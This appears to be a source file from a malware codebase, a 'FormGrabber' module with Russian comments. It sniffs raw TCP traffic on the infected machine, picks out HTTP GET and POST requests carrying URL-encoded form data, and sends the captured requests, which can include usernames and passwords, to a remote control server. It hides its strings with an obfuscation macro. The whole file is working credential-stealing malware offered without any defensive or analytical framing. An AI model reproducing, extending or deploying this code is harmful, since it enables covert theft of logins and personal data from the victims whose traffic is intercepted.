#include "system.h"
#include "core\sniffer.h"
#include "core\file.h"
#include "Manager.h"

namespace FormGrabber
{

struct FGS
{
	char contentType[32];
	int c_contentType;
	int counter;
};

static DWORD WINAPI ThreadSniffer( void* );

void Start( uint hash, StringBuilder& nameProcess, StringBuilder& path )
{
}

void StartCrossSniffer()
{
	RunThread( ThreadSniffer, 0 );
}

static bool CallbackSniffer( const IPHeader* header, const void* data, int c_data, void* tag )
{
	if( data == 0 || c_data <= 0 ) return false;
	FGS* fgs = (FGS*)tag;

	int offset = (((byte*)data)[12] >> 4) * 4; //смещение данных (длина заголовка TCP-пакета в 32-битовых словах)
	const char* s = (const char*)data + offset; //начала HTTP запроса (или ответа)
	int c_s = c_data - offset;
	if( c_s < 16 ) return false;
	if( (s[0] == 'G' && s[1] == 'E' && s[2] == 'T') || (s[0] == 'P' && s[1] == 'O' && s[2] == 'S' && s[3] == 'T') )
	{
		if( Mem::IndexOf( data, c_data, fgs->contentType, fgs->c_contentType ) > 0 )
		{
			ManagerServer::SendData( _CS_("formgrabber"), s, c_s, true, _CS_("data.txt") );
		}
	}
	return false;
}

static DWORD WINAPI ThreadSniffer( void* )
{
	FGS fgs;
	Str::Copy( fgs.contentType, sizeof(fgs.contentType), _CS_("application/x-www-form-urlencoded") );
	fgs.c_contentType = Str::Len(fgs.contentType);
	fgs.counter = 0;
	Sniffer::Filter( 0, 0, 0, 0, IPPROTO_TCP, CallbackSniffer, 2000, &fgs );
	return 0;
}

}
